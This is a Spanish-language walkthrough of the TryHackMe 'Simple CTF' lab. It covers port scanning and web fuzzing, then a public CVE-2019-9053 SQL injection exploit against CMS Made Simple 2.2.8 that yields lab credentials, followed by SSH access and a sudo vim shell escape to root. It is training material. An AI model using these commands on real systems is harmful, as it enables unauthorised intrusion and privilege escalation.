---
tags:
  - Cybersecurity
  - Labs
  - TryHackMe
  - Easy
  - Linux
  - HTTP
  - FuzzingWeb
  - SQLI
  - SSH
  - PrivilegeEscalation
  - Sudo
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#HTTP|HTTP]]
		- [[#HTTP#Fuzzing Web|Fuzzing Web]]
	- [[#Enumeración#Searchsploit|Searchsploit]]
- [[#Explotación|Explotación]]
	- [[#Explotación#SQL Injection (CVE-2019-9053)|SQL Injection (CVE-2019-9053)]]
	- [[#Explotación#SSH|SSH]]
	- [[#Explotación#Escalada de Privilegios|Escalada de Privilegios]]
		- [[#Escalada de Privilegios#Sudo|Sudo]]

---
# Resolviendo la máquina Simple CTF

>En esta publicación, comparto cómo resolví la máquina **Simple CTF** de [TryHackMe](https://tryhackme.com/room/easyctf).

---
## Enumeración
### Ping

`ping -c 1 10.10.136.186`

![[Pasted image 20250801082503.png]]

*TTL=63* -> **Linux**
### Nmap

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn  10.10.136.186 -oG allPorts`

![[Pasted image 20250801082555.png]]

`nmap -p21,80,2222 -sCV 10.10.136.186 -oN targeted`

![[Pasted image 20250801082629.png]]
### HTTP

`http://10.10.136.186/index.html`

![[Pasted image 20250801082705.png]]

`http://10.10.136.186/robots.txt`

![[Pasted image 20250801082800.png]]

Se identifica al usuario `mike` en el archivo `robots.txt`.
#### Fuzzing Web

`dirb http://10.10.136.186/`

![[Pasted image 20250801085825.png]]
![[Pasted image 20250801085848.png]]

`http://10.10.136.186/simple/`

![[Pasted image 20250801083022.png]]

![[Pasted image 20250801083044.png]]

`http://10.10.136.186/simple/admin/login.php`

![[Pasted image 20250801085946.png]]
### Searchsploit

El sitio utiliza **CMS Made Simple** versión *2.2.8*, un gestor de contenido conocido por ciertas vulnerabilidades previas.

`searchsploit CMS Made Simple 2.2.8`

![[Pasted image 20250801090108.png]]

`searchsploit -m 46635`

![[Pasted image 20250801090321.png]]

---
## Explotación
### SQL Injection (CVE-2019-9053)

En caso de que el exploit descargado no funcione correctamente, se puede utilizar la alternativa: [CVE-2019-9053](https://github.com/so1icitx/CVE-2019-9053).

`git clone https://github.com/so1icitx/CVE-2019-9053 `

`cd CVE-2019-9053`

`python3 exploit.py -u http://10.10.136.186/simple/ -c -w /usr/share/wordlists/rockyou.txt`

![[Pasted image 20250801090633.png]]

Se encuentra el usuario `mitch` y contraseña `secret`.
### SSH

Se accede al servicio **SSH** en el puerto 2222.

`ssh mitch@10.10.136.186 -p 2222`

![[Pasted image 20250801091722.png]]
### Escalada de Privilegios
#### Sudo

`sudo -l`

![[Pasted image 20250801092421.png]]

Se detecta el permiso: `/usr/bin/vim`, se busca en [GTFOBins](https://gtfobins.github.io/gtfobins/vim/#sudo).

![[Pasted image 20250801092618.png]]

`sudo vim -c ':!/bin/sh'`

![[Pasted image 20250801092652.png]]

---


